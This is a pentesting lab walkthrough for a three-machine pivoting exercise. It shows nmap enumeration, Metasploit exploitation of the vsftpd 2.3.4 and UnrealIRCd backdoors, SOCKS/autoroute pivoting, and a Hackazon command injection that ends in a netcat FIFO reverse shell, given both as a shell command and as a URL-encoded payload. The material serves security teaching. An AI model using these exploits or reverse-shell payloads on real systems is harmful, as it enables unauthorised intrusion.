# Lab Introduction

The lab is designed such that there are three vulnerable machines for you to test your hacking skills.
However, to make it a bit more challenging, only one of the machines is directly reachable by the attacker (you):

![Network Diagram](./resources/Network%20Diagram.png)

It's quite common in modern networks that machines will be isolated from one another by firewalls and reside in different network segments.
To overcome this, you will need to perform lateral movement and pivot through each machine on your way to the final target.
You will also learn how to utilise Metasploit proxies to daisy-chain multiple pivots.

There will also be a network intrusion detection system monitoring the whole network for malicious behaviour.
However, it's been set to "alert" mode, so it won't block you even once you've been detected.
You should **keep this open** while doing the lab to see what behaviours are detectable.

## Pre-Requisite Knowledge

- Comfortable and familiar with Linux, including using the shell, how file permissions work, SSH, etc.
- Understanding the basics of TCP/IP and routing

Some familiarity scripting with Bash or Python, as well the basics of Metasploit, are optional but helpful here.

## Learning Outcomes

1. Learn how to use `nmap` to discover hosts on a network, and the services running on those hosts.
2. Learn how to identify vulnerable services that can be exploited by using network probes.
3. Learn how common network intrusion detection systems work
4. Learn about the techniques used by attackers to evade NIDS systems and avoid detection
5. Learn how common stateful firewalls such as UFW and Windows Firewall are used to control network traffic
6. Learn how to perform horizontal lateral movement through a target network, and how it can be prevented
7. Learn about common misconfigurations that can lead to privilege escalation

## Rules for the lab

All of your targets will be on the 172.16.0.0/12 subnet (i.e. 172.16.0.0–172.31.255.255).
Avoid attacking anything outside of this range unless [you want to go to jail](https://www.legislation.gov.uk/ukpga/1990/18/contents).

Also, no cheating:

1. Don't use `docker inspect` to figure out the IP addresses of the machines
2. Don't connect your attacking machine directly to the internal networks
3. Don't use `docker exec` to spawn a shell in the services

The only docker command you will need is the one to view the NIDS logs, but there is already a shortcut on the Desktop for you:

```
docker logs --follow --tail=0 snort3
```

However, feel free to Google anything or refer to the list of reading materials at the bottom.
The targets prepared for you are commonly used, openly available machines with plenty of walkthroughs available online.
This is a networking lab, not a Metasploit exercise.


# Common Questions

1. "What does setting the `some option` variable in Metasploit do?"
   - It depends on the module and payload you've currently got selected.
   Check `show options` and `show advanced` in Metasploit
   - There's also the [extra resources](#extra-resources), and Google is your best friend.
2. "My `nmap` scan isn't showing as many services as the examples you've got!"
   - It takes some time for all the services to spin up, even after Vagrant has finished booting.
   Give it another 5-10 minutes and it should be ready.




# First Target

## Host Discovery

After starting the lab, the first target will be accessible to you on the subnet 172.24.0.0/16, but we don't know it's exact IP address.
Our first step will be to find any active machines on the subnet, for which we can use Nmap's host discovery scan.
Host discovery uses a variety of TCP, UDP, ICMP and ARP requests to determine if a given IP address is up.
It uses several probes since one or more could be blocked by firewalls, increasing the chance of detection.

Nmap always performs host discovery by default, so to only perform host discovery we can just disable the other scans with the `-sn` option:

```
┌──(root㉿kali)-[~]
└─# nmap -sn 172.24.0.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 19:48 EDT
Nmap scan report for 172.24.0.2
Host is up (0.00049s latency).
MAC Address: 02:42:AC:18:00:02 (Unknown)
Nmap scan report for 172.24.0.1
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 1.95 seconds
```

One of the 2 hosts will be yourself (172.24.0.1) and the other is the target box.

## Port Scanning

We can then scan the machine we found to see what ports are open and what services are running.
For this we use Nmap's SYN scan and version scan capabilities together.

The SYN scan `-sS` detects if a port is open by performing a partial TCP handshake on every desired port.
We send a TCP packet with the `SYN` flag set to each port, and if the target responds with a `SYN/ACK` then we know the port is open.

The version scan `-sV` can then determine the exact software running by interrogating each port with known version probes.
We can combine the two types of scans with the option `-sSV`

```
┌──(root㉿kali)-[~]
└─# nmap -sSV -p0-65535 172.24.0.2 -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 20:15 EDT
Nmap scan report for 172.24.0.2
Host is up (0.0000080s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  ingreslock?
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
45321/tcp open  java-rmi    GNU Classpath grmiregistry

~~~ Unknown service omitted for brevity ~~~

MAC Address: 02:42:AC:18:00:02 (Unknown)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.30 seconds
```

The scan reveals various outdated and vulnerable services.
Nmap can even tell you the specific CVEs that you can exploit if you pass the `--script vuln` option.

Our goal is get a shell on the target box (ideally as root).
Feel free to use any vulnerability you find to achieve this, the one shown below exploits the FTP and SSH server.

## SMB Enumeration

Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.

The NMAP scripting engine includes several scripts for investigating SMB shares.
You can use them by passing the option `--script <script-name>`, or run them all with `--script smb*`.
Some of these scripts include:

- `smb-enum-shares` – Enumerates SMB shares in an SMB server.
- `smb-user-enum` - Enumerates the users on an SMB server, with as much information as possible.
- `smb-brute` – Performs brute-force password auditing against SMB servers.
- `smb-protocols` - Attempts to list the supported protocols and dialects of a SMB server.
- `smb-security-mode` and `smb2-security-mode` - Returns information about the SMB security level determined by SMB.
- `smb-vuln-*` – Identifies whether the SMB server is vulnerable to any known exploits.

These scripts can be very useful, for example the `smb-brute` script finds two valid pairs of credentials we could use:

```
Host script results:
| smb-brute: 
|   msfadmin:msfadmin => Valid credentials
|_  user:user => Valid credentials
```

Another useful tool is SMBMap, an SMB enumeration tool designed with penetration testing in mind:

```
┌──(root㉿kali)-[~]
└─# smbmap -H 172.24.0.3

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.24.0.3:445  Name: 172.24.0.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (6e460159da77 server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (6e460159da77 server (Samba 3.0.20-Debian))
[*] Closed 1 connections                                                                                                     
```

## SMTP Enumeration

The Simple Mail Transfer Protocol (SMTP) is a TCP/IP protocol used in sending emails over a network.
SMTP is a push protocol and is used to send the mail whereas POP (post office protocol) or IMAP (internet message access protocol) is used to retrieve those emails at the receiver’s side. 

SMTP has 3 commands in particular that are useful for enumerating available users:

- `VRFY`: It is used to validate the user on the server.
- `EXPN`: It is used to find the delivery address of mail aliases
- `RCPT` TO: It points to the recipient’s address.

All three can allow us to leak the users on the SMTP service, but to determine which ones are supported we can use the `smtp-commands` NSE script:

```
┌──(root㉿kali)-[~]
└─# nmap -sSV -p 25 --script smtp-commands -T5 172.24.0.3 

~~~ Omitted for brevity ~~~

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN

~~~ Omitted for brevity ~~~
```

We can see that the `VRFY` command is supported by this client, which we can use with our other tools.

[smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/) (comes with Kali) is a username guessing tool primarily for use against the default Solaris SMTP service.
It performs a similar role to Nmap's `smtp-enum-users` script, but allows you to use a custom wordlist for usernames tested, or just test a single username.

```
┌──(root㉿kali)-[~]
└─# smtp-user-enum -M VRFY -U '/usr/share/wordlists/metasploit/unix_users.txt' -t 172.24.0.3
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Jul 14 18:52:28 2024 #########
172.24.0.3: backup exists
172.24.0.3: bin exists
172.24.0.3: daemon exists
172.24.0.3: distccd exists
172.24.0.3: ftp exists
172.24.0.3: games exists
172.24.0.3: gnats exists
172.24.0.3: irc exists
172.24.0.3: libuuid exists
172.24.0.3: lp exists
172.24.0.3: list exists
172.24.0.3: mail exists
172.24.0.3: man exists
172.24.0.3: mysql exists
172.24.0.3: news exists
172.24.0.3: nobody exists
172.24.0.3: postgres exists
172.24.0.3: postfix exists
172.24.0.3: postmaster exists
172.24.0.3: proxy exists
172.24.0.3: root exists
172.24.0.3: ROOT exists
172.24.0.3: service exists
172.24.0.3: sshd exists
172.24.0.3: sync exists
172.24.0.3: sys exists
172.24.0.3: syslog exists
172.24.0.3: uucp exists
172.24.0.3: user exists
172.24.0.3: www-data exists
######## Scan completed at Sun Jul 14 18:52:29 2024 #########
30 results.

168 queries in 1 seconds (168.0 queries / sec)
```

Determining a list of users can be helpful for administration, by seeing who has an account on a server,
or for penetration testing or network footprinting, by determining which accounts exist on a system.

## FTP Enumeration

File Transfer Protocol (FTP) is a client-server model communication protocol used to transfer files between devices on a network.
It is a plain-text protocol (which means no encryption), but it does support authentication for clients using a username and password.

By default, FTP runs on port 21, and sometimes SFTP or FTPS can be found on port 2121.
We can use Nmap and NSE to detect what FTP services are running on these ports with the version scan and the `ftp*` scripts:

```
┌──(root㉿kali)-[~]
└─# nmap -sSV -p 21 --script ftp* 172.24.0.3             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 19:16 EDT
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 172.24.0.3
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      https://www.securityfocus.com/bid/48539
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.24.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
| ftp-brute: 
|   Accounts: 
|     user:user - Valid credentials
|_  Statistics: Performed 3646 guesses in 602 seconds, average tps: 5.9
MAC Address: 02:42:AC:18:00:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 602.10 seconds
```

## Other Vulnerabilities

The target machine contains many vulnerabilities you can exploit to get a shell.
Feel free to take some liberty with your choice of exploit, as long as you can pop a shell at the end.
You can also follow the example for now and come back in your own time to test other initial access techniques.

The NSE contains a large category of scripts for detecting vulnerabilities and automatically highlighting exploitable CVEs for you.
Try running the following command to choose a suitable vulnerability:

```shell
nmap -sSV --script vuln <target-IP>
```
For this example, I will show how we can use the FTP server on port 21 to get remote code execution.

## Getting A Shell

VSFTPd 2.3.4 contains a backdoor we can exploit to achieve a shell, and since the process is running as the root user we'll also get a root shell.
We can use the metasploit module for this to automate the exploit, and we'll use our access to create a SOCKS proxy for future pivoting.
To begin, open up the Metasploit console:

```
┌──(root㉿kali)-[~]
└─# msfconsole

msf6 > 
```

We'll use metasploit to get a basic shell on the target machine with the `exploit/unix/ftp/vsftpd_234_backdoor` module,
and then upgrading our shell to a Meterpreter session:

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.24.0.2
RHOSTS => 172.24.0.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 172.24.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.24.0.2:21 - USER: 331 Please specify the password.
[+] 172.24.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.24.0.2:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.24.0.1:41037 -> 172.24.0.2:6200) at 2024-07-13 20:31:33 -0400

id
uid=0(root) gid=0(root)
```

As we can see from running `id`, our shell is running as the root user.
Next, we need to upgrade our basic shell to a Meterpreter shell.
This is done by sending our basic shell to the background with (Ctrl+Z), and then upgrading the session with `sessions -u`

```
^Z
Background session 1? [y/N]  y
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.24.0.1:4433 
[*] Sending stage (1017704 bytes) to 172.24.0.2
[*] Meterpreter session 2 opened (172.24.0.1:4433 -> 172.24.0.2:57840) at 2024-07-13 20:35:59 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

The Meterpreter session is much more useful than a bare shell, it allows us to easily upload/download files,
set up proxies or port-forwarding, and more (run the `help` command to see everything you can do).

## Setting Up a Proxy

Meterpreter also allows us to see what network interfaces the machine has attached with the `ifconfig` command:

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface 21
============
Name         : outer_net0
Hardware MAC : 02:42:ac:18:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.24.0.2
IPv4 Netmask : 255.255.255.0


Interface 27
============
Name         : middle_net0
Hardware MAC : 02:42:ac:19:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.25.0.2
IPv4 Netmask : 255.255.255.0
```

We can see the network we used to compromise the machine (`172.24.0.0/24`), localhost (duh),
as well as a new network - `172.25.0.0/24`.

To progress further through the network you have two options:

1. Upload and install all the tools we intend to use to the compromised box, or
2. Set up a proxy to tunnel traffic from our attacker machine into the internal network

It's often not a good idea to upload our tools onto the compromised machine for various reasons
(hardware limitations, protecting your tools, lack of root privileges, etc.),
so instead we'll pivot through the box with a proxy.

First, we need to set up a route in Metasploit for this new subnet:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > `use post/multi/manage/autoroute`
msf6 post(multi/manage/autoroute) > set SUBNET 172.25.0.0
SUBNET => 172.25.0.0
msf6 post(multi/manage/autoroute) > set NETMASK 24
NETMASK => 24
msf6 post(multi/manage/autoroute) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/autoroute) > run

[*] Running module against 172.24.0.2
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.24.0.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.25.0.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.24.0.0         255.255.255.0      Session 2
   172.25.0.0         255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
```

Now Metasploit knows to route any traffic for `172.25.0.0/24` through our Meterpreter session,
giving us access to the internal network from Metasploit running on our attacker machine.

However, this is only usable within Metasploit as it's set up in Metasploit's routing tables.
To make this route accessible to all our tools outside Metasploit, we can set up a SOCKS proxy like so:

```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```

Now we have a SOCKS5 proxy running on our local machine (which by default listens on `0.0.0.0:1080`).
The last step is to add this proxy to our Proxychains4 configurations so we can use it with our other applications.
Edit your configuration at `/etc/proxychains4.conf` using an editor of your choice and insert your new proxy at the bottom:

```
strict_chain
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

# Second Box

## Host Discovery

With our first pivot set up, we can now investigate the new subnet we found earlier.

First, we need to find any active hosts on the network.
Since our SOCKS proxy only supports TCP and UDP traffic, we can't rely on the default host discovery which uses ICMP and other protocols.
Instead, we'll specify our own custom host discovery scan with the following options:

- `-sn` - No port scanning, only host discovery
- `-PS` - TCP SYN Ping
- `-PA` - TCP ACK Ping
- `-PU` - UDP Ping
- `-PY` - SCTP INIT Ping

```
┌──(root㉿kali)-[/vagrant]
└─# proxychains nmap -sn -PS -PA -PU -PY 172.25.0.0/24           

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 00:35 EDT
Nmap scan report for 172.25.0.2
Host is up (0.000049s latency).
MAC Address: 02:42:AC:19:00:02 (Unknown)
Nmap scan report for 172.25.0.3
Host is up (0.000062s latency).
MAC Address: 02:42:AC:19:00:03 (Unknown)
Nmap scan report for 172.25.0.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.06 seconds

```

This reveals that there are 3 hosts on the network:

1. 172.25.0.1 - The gateway server
2. 172.25.0.3 - The box we've already compromised
3. 172.25.0.2 - A new machine we're interested in

## Port Scanning

Now that we've identified the host of interest, we can run a more targeted version scan to identify any active services:

```
┌──(root㉿kali)-[/vagrant]
└─# proxychains nmap -sSV 172.25.0.2 -p0-65535 -T5          
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 00:57 EDT
Nmap scan report for 172.25.0.2
Host is up (0.0000090s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
6667/tcp open  irc         UnrealIRCd
6697/tcp open  irc         UnrealIRCd
8067/tcp open  irc         UnrealIRCd
MAC Address: 02:42:AC:19:00:02 (Unknown)
Service Info: Hosts: 172.26.0.3, F715F2F9DEE5, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.60 seconds
```

We can see that on ports 6667 and 6697 there is an IRC service running.

You can connect to the IRC server with `proxychains irssi -c 172.25.0.2` and run the `/version` command,
which will reveal that the server is running Unreal 3.2.8.1.

You can also see this with the `irc-unrealircd-backdoor.nse` NSE script:

```
┌──(root㉿kali)-[/vagrant]
└─# proxychains nmap --script irc-unrealircd-backdoor.nse -p 6667,6697 172.25.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 23:14 EDT
Nmap scan report for 172.25.0.2
Host is up (0.000075s latency).

PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
6697/tcp open  ircs-u
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
MAC Address: 02:42:AC:19:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds
```

This particular version is vulnerable to a known exploit thanks to an old backdoor, so we can use Metasploit to pop a shell.
Again, feel free to use whatever vulnerability you want here to gain access to the server,
but for this example I'll demonstrate exploiting the UnrealIRC service.

## Selecting a Payload

Fortunately, Metasploit comes with the `unix/irc/unreal_ircd_3281_backdoor` module just for this exploit.

Setting up a listener will be more complicated this time as we're pivoting through our session on the first machine.
This is also dependent on the payload we try to deploy.
You can list all the available payloads for a given module with `show payloads` in your Metasploit console

It must fit two criteria :

1. It only uses tools that the target has (it doesn't have `telnet`, and I spent too many hours figuring that out)
2. It can set up the listener on/through our previous session

We can either set up a bind shell listener on the target and connect to it through our previous session,
or we can set up a reverse shell listener in our previous session and connect back to it from our target.

For the reverse shell, set `LHOST` to the IP address of the pivot on the same network as the target,
and `LPORT` (the listening port on our pivot session) to an unused port.
You can check which ports are in use by running `netstat -a` in your Meterpreter session.
You'll need to use an unprivileged port (higher than 1024) if you didn't get root privileges previously.
Finally, you'll need to set the `ReverseListenerComm` option to the session you want to pivot through
(your first Meterpreter session should be session 2)

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 8
payload => cmd/unix/reverse_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 172.25.0.3
LHOST => 172.25.0.3
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 11337
LPORT => 11337
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set ReverseListenerComm 2
ReverseListenerComm => 2
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 172.25.0.3:11337 via the meterpreter on session 2
[*] 172.25.0.2:6667 - Connected to 172.25.0.2:6667...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 172.25.0.2:6667 - Sending backdoor command...
[*] Command shell session 3 opened (172.25.0.3:11337 -> 172.25.0.2:59464 via session 2) at 2024-07-17 23:32:23 -0400

id
uid=1121(boba_fett) gid=100(users) groups=100(users)
```

Alternatively, using a bind shell is slightly simpler.
You'll need to set `LPORT` (the port on the target which the shell will listen on) to an unused port.
We can't just check with `netstat -a` since we don't have access yet,
but a good start would be to pick an unprivileged port that didn't show up in your nmap scan,
and one that's not [commonly used](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers#Well-known_ports).

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 1
payload => cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 21337
LPORT => 21337
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] 172.25.0.2:6667 - Connected to 172.25.0.2:6667...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 172.25.0.2:6667 - Sending backdoor command...
[*] Started bind TCP handler against 172.25.0.2:21337
[*] Command shell session 5 opened (172.25.0.3:50822 -> 172.25.0.2:21337 via session 2) at 2024-07-17 23:48:41 -0400

id
uid=1121(boba_fett) gid=100(users) groups=100(users)
```

Now we have a basic shell running as the `boba_fett`.
Same as last time, you can upgrade this shell to a Meterpreter session with `sessions -i -1`.

## Setting up a route

Running `ifconfig` on your new Meterpreter session will show that you've found another network:

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 6
[*] Starting interaction with 6...

meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface 20
============
Name         : middle_net0
Hardware MAC : 02:42:ac:19:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.25.0.2
IPv4 Netmask : 255.255.255.0


Interface 26
============
Name         : inner_net0
Hardware MAC : 02:42:ac:1a:00:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.26.0.3
IPv4 Netmask : 255.255.255.0
```

We can add this new network to our Metasploit routing table same as last time:

```
msf6 post(multi/recon/local_exploit_suggester) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
SUBNET => 172.26.0.0
msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
SUBNET => 172.26.0.0
msf6 post(multi/manage/autoroute) > set NETMASK 24
NETMASK => 24
msf6 post(multi/manage/autoroute) > set SESSION 6
SESSION => 6
msf6 post(multi/manage/autoroute) > run

[*] Running module against 172.26.0.3
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.26.0.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > 
```

Now we can access this network through our existing SOCKS proxy using `proxychains4` on our own machine.

```
┌──(root㉿kali)-[/vagrant]
└─# proxychains nmap -sSV -T5 -p0-65535 172.26.0.2 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 02:06 EDT
Nmap scan report for 172.26.0.2
Host is up (0.0000080s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:42:AC:1A:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.03 second
```
# Final box

This is running a web service called Hackazon

## Attaining Remote Code Execution via Command Injection

We can exploit an OS command injection vulnerability to attain arbitrary code execution as the user running the web server process, which in this case is the www-data user.
The URL query parameter at http://localhost:8081/account/documents?page=delivery.html is vulnerable to OS command injection, so you can run arbitrary OS commands by going to:

http://localhost:8081/account/documents?page=<your-command-here>


Two notes though:

- Firstly I found increased reliability by putting a test before your command, i.e.
    http://localhost:8081/account/documents?page=test|<your-command-here>


- Secondly, I found that whenever there was an ampersand in the command, such as a `2>&1`, it stopped reading at the `&` and wouldn't work.

## Setting up the listener - The easy way

You could just do `nc -lvnp 1337` and be done, but if you want a proper meterpreter shell keep reading.

## Setting up the listener - The proper way

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.17.0.1:1337
```

For me, my docker network set my host machine to 172.17.0.1 and assigned the container 172.17.0.2, use your own IP addresses appropriately.

## Launching the reverse shell

Now to start a netcat reverse shell on the victim machine you have to do a janky workaround as the docker container is OpenBSD based,
so instead of normal netcat it has a more "secure" version without the `-e` or `-c` flags that we would usually use to pipe `/bin/bash` straight into it.

First, create a temporary FIFO pipe (pipeline) in /tmp by running `mknod /tmp/backpipe p` through command injection.
Go to the following link in your browser:

http://localhost:8081/account/documents?page=test|mknod%20/tmp/backpipe%20p

You don't need to double URL encode your special characters, the browser might hide from you that it does it automatically once though.
Next, you can start the reverse shell by running the following command (with your own IP address and port substituted):

```shell
/bin/sh 0</tmp/backpipe | nc <YOUR-HOST/ATTACKER-IP> 1337 1>/tmp/backpipe
```

Which in command-injected URL form looks something like:

http://localhost:8081/account/documents?page=test|/bin/sh%200%3C/tmp/backpipe%20|%20nc%20172.17.0.1%201337%201%3E/tmp/backpipe


This tab may look like it's loading forever in your browser because it makes a blocking request on the PHP server that doesn't release the thread until the reverse shell closes.

